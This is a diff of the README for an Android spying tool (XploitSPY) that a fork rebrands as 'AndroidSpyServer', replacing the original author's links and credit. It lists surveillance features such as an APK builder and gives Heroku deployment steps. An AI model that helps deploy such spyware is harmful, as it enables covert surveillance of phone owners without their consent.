@@ -1,5 +1,5 @@
 <p align="center">
-<img src="https://github.com/XploitWizer/XploitSPY/blob/herooku/assets/webpublic/logo.png" height="60"><br>
+<img src="https://github.com/vikashmobileclinic/AndroidSpyServer/blob/herooku/assets/webpublic/logo.png" height="60"><br>
 A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 </p>
 
@@ -19,7 +19,7 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 - Command Queuing
 - Built In APK Builder
 
-## Installation on Server and VPS [Click Here](https://github.com/Xploitwizer/XploitSPY)
+## Installation on Server and VPS [Click Here](https://github.com/vikashmobileclinic/AndroidSpyServer)
 
 ## Installation on Heroku Free Server
 
@@ -34,7 +34,7 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 
 3. Now install Heroku CLI on your Computer [Instuctions](https://devcenter.heroku.com/articles/heroku-cli)
 
-4. Now open your terminal and run command `git clone -b herooku https://github.com/XploitWizer/XploitSPY`
+4. Now open your terminal and run command `git clone -b herooku https://github.com/vikashmobileclinic/AndroidSpyServer`
 
 5. It will download Latest codes for you in your PC
     
@@ -57,5 +57,5 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 XploitSPY is built for Educational Purpose. Use at your own Risk.</b>
 
 <br>
-<p align="center">Made with ❤️ By <a href="https://xploitwizer.com">XploitWizer</a></p>
+<p align="center">Made with ❤️ By <a href="https://github.com/vikashmobileclinic/AndroidSpyServer/">Mr.Chauhan</a></p>
 
